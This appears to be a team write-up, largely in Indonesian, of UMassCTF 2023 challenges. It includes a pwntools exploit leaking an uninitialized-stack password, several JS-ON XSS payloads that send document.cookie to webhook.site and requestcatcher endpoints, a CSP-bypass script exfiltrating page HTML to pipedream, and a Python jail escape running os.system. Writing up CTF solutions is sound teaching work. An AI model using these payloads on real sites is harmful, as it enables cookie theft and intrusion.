# last minute pwn - PWN

chall simple yang membutuhkan kita untuk meleak random value yang di generate /dev/urandom dan memasukkannya sebagai password untuk mendapatkan flag, untuk meleak yang perlu dilakukan adalah memanfaatkan scanf error yang tidak diantisipasi program, di menu 1  (game) kita diminta untuk memverifikasi untuk bermain atau tidak dengan menginput y / n namun jika kita input angka program akan tetap berjalan tanpa menginisiasi variable stack yang akan digunakan sebagai soal, setahu saya bug ini dinamakan UDA (unitialized data), dengan begitu kita bisa melihat isi stack program kita, di fungsi login password yang seharusnya terletak di segment bss di copy ke stack oleh karena itu kita dapat mengetahui random value yang sudah tergenerate, namun alamat stack password berada lebih rendah daripada stack frame dari game, sehingga kita perlu start game 2x (start again) agar stack frame kita lebih rendah daripada alamat stack password, dengan memanfaatkan bug tadi password tidak akan teroverwrite oleh soal karena tidak terinisialisasi (gagal), dengan itu kita dapat leak password.

```python
#!/usr/bin/env python3

from pwn import *

exe = 'last_minute_pwn'
elf = context.binary = ELF(exe, checksec=False)
libc = ELF('/usr/lib/libc.so.6', checksec=False)
context.log_level = 'debug'

cmd = '''
b * authenticate_admin+157
c
'''

if args.REMOTE:
    p = remote('last_minute_pwn.pwn.umasscybersec.org', 7293)
else:
    p = process()

### EXPLOIT HERE ###

def calculate():
    p.recvuntil(f': '.encode())
    a = int(p.recvuntil(b'+').split(b'+')[0].strip())
    b = int(p.recvuntil(b'=').split(b'=')[0].strip())
    return a + b 

def win_round():
    p.sendline(b'1')
    p.sendline('y')
    for i in range(20):
        p.sendline(b'1')
        result = calculate()
        p.sendline(f'{result}'.encode())

# gdb.attach(p, cmd)

# leak
p.sendline(b'2')
p.sendline(b'\x00'+b'apasi') # rubish

p.sendline(b'1')
p.sendline(b'a') # scanf fail
p.sendline(b'3')
p.sendline(b'a') # scanf fail
p.sendline(b'2') # print leak

p.recvuntil(b'2. ')
password = p.recvline(0)
print(password)

# not used to solve chall but fun to win the game
win_round()

# and this the real win
p.sendline(b'2')
p.sendline(password)
    
p.interactive()
```

```
UMASSCTF{todo:_think_of_a_creative_flag}
```

# JS-ON - web
Pada challenge ini kita akan diberikan website seperti berikut

![](https://i.imgur.com/u0lTd7u.png)

Pada website ini kita akan menemukan source code dari code js nya seperti berikut

```javascript 
...snip...
                const handleKeys = (JSon,cur)=>{
                    Object.keys(JSon).forEach(key=>{
                        try{
                            let keywords = key.split('_');
                            let type = keywords[0];
                            let name =  keywords[1];
                            switch(type){
                                case 'var':
                                    cur[name] = JSon[key];
                                    break;
                                case 'func':
                                    if(!(cur[name] in cur)){
                                        cur[name] = Function(JSon[key])
                                    }
                                    break;
                                case 'obj':
                                    cur[name] = cur[name] == undefined ? {} : cur[name];
                                    cur = handleKeys(JSon[key],cur[name]);
                                    break;
                            }
                        }
                        catch(e){
                            throw new Error('Error while parsing JS-ON!')
                        }
                    })
                    return cur;
                }
                handleKeys(JSon,this)
...snip...
```

Fungsi diatas lah yang akan menghandle JSON yang kita masukkan pada textarea berikut.

![](https://i.imgur.com/eYbPyYI.png)

Untuk mengeksploitasinya kita perlu memahami logic dari fungsi tersebut. Fungsi tersebut akan menghadle json kita dan akan mengambil word pertama yang di split oleh `_`. Misal saja `var_message` dimana `var` adalah word pertama dan `message` adalah word kedua, jika kita buat seperti gambar diatas maka input yang kita masukkan akan diproses oleh fungsi tersebut dan kita akan bisa mengakses variable `message` lewat developer console seperti berikut.

![](https://i.imgur.com/AMINRvD.png)

Jika kita membuat 
```json
{
	"obj_foo": {
		"func_bar": "console.log('foobar')"
	}
}
```
maka akan menghasilkan object foo dan fungsi bar seperti berikut:

![](https://i.imgur.com/xf8a1WQ.png)

Jadi dari logic program di atas kita bisa gunakan untuk mengoverwrite sebuah fungsi didalam DOM misalnya seperti `onhashchange`, `onerror`, etc.

Berikut payload yang saya gunakan untuk mendapatkan XSS pada challenge tersebut.

```json
{
    "func_onhashchange": "alert(1)",
    "obj_document": {
        "obj_location": {
            "var_hash": "foo"
        }
    }
}
```

Kita masukkan ke dalam js-on dan kita akan mendapatkan XSS.

![](https://i.imgur.com/BWH8Rh2.png)

Berikut payload lainnya yang digunakan peserta lainnya.
```json
{
    "func_Error": "navigator.sendBeacon('https://webhook.site/...', document.cookie)",
    "func_onerror": "|" 
}
```

```json
{
    "obj_Object": {
        "func_keys": "fetch('https://webhook.site/5ae647b5-d767-44cd-bf06-13d8b555e088/'+btoa(document.cookie))"
    },
    "obj_something": {
        "var_a": "dummy"
    }
}
```

```json 
{
    "func_onanimationend": "navigator.sendBeacon('https://webhook.site/...', document.cookie)",
    "obj_document": {
        "obj_head": {
            "obj_firstElementChild": {
                "var_innerText": "@keyframes xss{} body{animation-name: xss;}"
            }
        }
    }
}
```

```json 
{
    "func_Function": "fetch('https://l.requestcatcher.com/'+document.cookie);",
    "obj_lol": {
        "func_pepe": "lol"
    }
}
```

# JS-ONv2 - web
Challenge ini memiliki source code yang hapir sama dengan challenge sebelumnya. Pada challenge ini kita perlu untuk membypass sebuah blacklist yang kita tidak tahu.

Untuk challenge ini kita akan mensolvenya dengan mengoverwrite sebuah fungsi yang di call di dalam fungsi berikut:

```javascript
...snip...
                const handleKeys = (JSon,cur)=>{
                    Object.keys(JSon).forEach(key=>{
                        try{
                            let keywords = key.split('_');
                            let type = keywords[0];
                            let name =  keywords[1];
                            switch(type){
                                case 'var':
                                    if(typeof JSON[key] === 'string'){
                                        JSON[key] = JSON[key].replaceAll('<','').replaceAll('>','');
                                    }
                                    cur[name] = JSon[key];
                                    break;
                                case 'func':
                                    if(!(cur[name] in cur)){
                                        cur[name] = Function(JSon[key])
                                    }
                                    break;
                                case 'obj':
                                    cur[name] = cur[name] == undefined ? {} : cur[name];
                                    cur = handleKeys(JSon[key],cur[name]);
                                    break;
                            }
                        }
                        catch(e){
                            throw new Error('Error while parsing JS-ON!')
                        }
                    })
                    return cur;
                }
                handleKeys(JSon,this)
...snip...
```

disini saya saya akan mengoverwrite fungsi `split` dan merubahnya jadi fungsi yang akan kita gunakan untuk mempop-up alert. Berikut payload yang saya gunakan untuk mendapatkan XSS di client side.

```json 
    {
        "obj_String": {
            "obj_prototype":{
                "func_split": "alert(1)"
            }
        },
        "var_foo":"foo"
    }
```

![](https://i.imgur.com/URshEwU.png)

# umassdining2 - web

Membypass CSP default-src self dengan melakukan upload js file ke server.

solve script:

```python
import requests
from urllib.request import urljoin
from hashlib import md5

# URL = "http://localhost:6942"
URL = "http://umassdining2.web.ctf.umasscybersec.org:6942/"

class API:
    def __init__(self, username, password, url=URL):
        self.username = username
        self.password = password
        self.url = url
        self.session = requests.Session()

    def login(self):
        res = self.session.post(urljoin(self.url, "/login"), data={
            "user": self.username,
            "pass": self.password
        })
        return res.text
    def register(self):
        res = self.session.post(urljoin(self.url, "/register"), data={
            "user": self.username,
            "pass": self.password
        })
        return res.text

    def submit(self, payload, **kwargs):
        res = self.session.post(urljoin(self.url, "/submit"), files={
            'submission': payload
        }, **kwargs)
        return res.text
    def username_md5(self):
        return md5(self.username.encode()).hexdigest()
    
if __name__ == "__main__":
    api = API("sold", "sold")
    user_hash = api.username_md5()
    print("user hash:", user_hash)
    api.register()
    api.login()
    print(api.submit(("asd.js", "document.location = 'https://eo50su9j1wqol0x.m.pipedream.net?c='+encodeURIComponent(document.documentElement.innerHTML)")))

    api = API(f"<script src='/uploads/{user_hash}/asd.js'></script>", "sold")
    api.register()
    api.login()
    print(api.submit(("foo.png", "foo")))
```

# JeopardyV3 Late solve -  misc
```python
from pwn import *

cyprus = {
	1 : b"Cyprus 100",
	2 : b"Cyprus 200",
	3 : b"Cyprus 300",
	4 : b"Cyprus 400",
	5 : b"Cyprus 500"
}

cypruss = {
	1 : b"nothing", #ok ''
	2 : b"Mercedes", #ok '{'
	3 : b"The Kingdom of Kourion", #https://en.wikipedia.org/wiki/Kourion '}', 't' 
	4 : b"Infinity Pool",# masih bingung dapet darimana  'x', 's'
	5 : b"Horseshoe" #https://www.yumpu.com/en/document/read/55608048/cyprus (DALI REGION) 'u', 'v', '('
}
#################
ChatGPT = {
	1 : b"Too Recent For ChatGPT 100",
	2 : b"Too Recent For ChatGPT 200",
	3 : b"Too Recent For ChatGPT 300",
	4 : b"Too Recent For ChatGPT 400",
	5 : b"Too Recent For ChatGPT 500"
}

ChatGPTs = {
	1 : b"beer", #https://edition.cnn.com/2022/11/22/business/budweiser-unsold-beer-world-cup/index.html ':'
	2 : b"Warhol", #https://www.nytimes.com/2023/01/17/us/ana-walshe-husband-murder-massachusetts.html ')'
	3 : b"Etsy", #https://www.theverge.com/2023/3/12/23636379/etsy-delaying-seller-payouts-silicon-valley-bank-collapse '+', 'g'
	4 : b"Dollar Tree", # https://edition.cnn.com/2021/11/23/investing/dollar-tree-prices-inflation/index.html '_', '<'	
	5 : b"Alex Murdaugh" #https://www.netflix.com/tudum/articles/murdaugh-murders-a-southern-scandal-release-date-news 'p', 'q'
}
#################
UMassCTFH = {
	1 : b"UMassCTF History 100",
	2 : b"UMassCTF History 200",
	3 : b"UMassCTF History 300",
	4 : b"UMassCTF History 400",
	5 : b"UMassCTF History 500"
}

UMassCTFHs = {
	1 : b"Indonesia", #ok '`', 'a'
	2 : b"George H. W. BuSHH", #https://ctftime.org/team/78233 'r'
	3 : b"October 17, 2020", #https://www.cics.umass.edu/event/hivestorm-cyber-defense-competition 'h'
	4 : b"UMass ACM", # https://umass.acm.org/  ',', '~', 'd'
	5 : b"Tuning a Web Application Firewall, IaaS, and More with Oracle" #ok 'b', 'y', 'z'
}
#################
Misc = {
	1 : b"Miscellaneous 100",
	2 : b"Miscellaneous 200",
	3 : b"Miscellaneous 300",
	4 : b"Miscellaneous 400",
	5 : b"Miscellaneous 500"
}

Miscs = {
	1 : b"Hopkinton", #https://www.boston.com/sports/boston-marathon/2021/09/22/unicorn-symbol-boston-marathon/ "'"
	2 : b"Russia", #ok 'e'
	3 : b"The Landlord's Game", #ok '['
	4 : b"President", #https://www.umassp.edu/about/past-presidents
	5 : b"Forever bracelet" #ok 'n', 'o'
}
#################
Oak = {
	1 : b"The Curse of Oak Island (The TV Show) 100",
	2 : b"The Curse of Oak Island (The TV Show) 200",
	3 : b"The Curse of Oak Island (The TV Show) 300",
	4 : b"The Curse of Oak Island (The TV Show) 400",
	5 : b"The Curse of Oak Island (The TV Show) 500"
}

Oaks = {
	1 : b"Lead cross", #ok '%'
	2 : b"it's another bobby dazzler", #ok '.', 'w'
	3 : b"Zena Halpern", #ok 'c', 'j'
	4 : b"James Anderson", #https://en.wikipedia.org/wiki/List_of_The_Curse_of_Oak_Island_episodes#ep77 '1', 'i'
	5 : b"Garden Shaft" #Historical landmark in Western Shore, Nova Scotia, Canada 'k', 'l', 'f'
}
#################

PAYLOAD = b"__builtins__.__dict__['__im'+'port__']('o'+'s').__dict__['sys'+'tem']('cat flag.txt')"

r = remote("jeopardyv3.misc.ctf.umasscybersec.org",1116)
r.recvS()
#start
r.sendline(b'ready')

### Cyprus
r.sendline(cyprus[1])
r.sendline(cypruss[1])
r.sendline(cyprus[2])
r.sendline(cypruss[2])
r.sendline(cyprus[3])
r.sendline(cypruss[3])
r.sendline(cyprus[4])
r.sendline(cypruss[4])
r.sendline(cyprus[5])
r.sendline(cypruss[5])

### ChatGPT
r.sendline(ChatGPT[1])
r.sendline(ChatGPTs[1])
r.sendline(ChatGPT[2])
r.sendline(ChatGPTs[2])
r.sendline(ChatGPT[3])
r.sendline(ChatGPTs[3])
r.sendline(ChatGPT[4])
r.sendline(ChatGPTs[4])
r.sendline(ChatGPT[5])
r.sendline(ChatGPTs[5])

### UMassCTF
r.sendline(UMassCTFH[1])
r.sendline(UMassCTFHs[1])
r.sendline(UMassCTFH[2])
r.sendline(UMassCTFHs[2])
r.sendline(UMassCTFH[3])
r.sendline(UMassCTFHs[3])
r.sendline(UMassCTFH[4])
r.sendline(UMassCTFHs[4])
r.sendline(UMassCTFH[5])
r.sendline(UMassCTFHs[5])

### Misc
r.sendline(Misc[1])
r.sendline(Miscs[1])
r.sendline(Misc[2])
r.sendline(Miscs[2])
r.sendline(Misc[3])
r.sendline(Miscs[3])
r.sendline(Misc[4])
r.sendline(Miscs[4])
r.sendline(Misc[5])
r.sendline(Miscs[5])

### Oak
r.sendline(Oak[1])
r.sendline(Oaks[1])
r.sendline(Oak[2])
r.sendline(Oaks[2])
r.sendline(Oak[3])
r.sendline(Oaks[3])
r.sendline(Oak[4])
r.sendline(Oaks[4])
r.sendline(Oak[5])
r.sendline(Oaks[5])

# jailbreak
r.sendline(b'jailbreak')

# Here are the characters you are allowed to use: '', ' ', '%', "'", '(', ')', '+', ',', '.', '1', ':', '<', '[', ']', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '}', '~'
r.sendline(PAYLOAD)
r.interactive()
# >>> UMASS{i-hope-you-enjoyed-my-final-challenge}
```

# Our Team Writeup
@daffainfo

- Deepfried - web
https://github.com/daffainfo/ctf-writeup/tree/main/UMass%20CTF%202023

# Challenge Archive
Here is the mirror of our challenges: [https://github.com/UMassCybersecurity/UMassCTF-2023-challenges-public](https://github.com/UMassCybersecurity/UMassCTF-2023-challenges-public "https://github.com/UMassCybersecurity/UMassCTF-2023-challenges-public"). Once again, thanks for competing this weekend!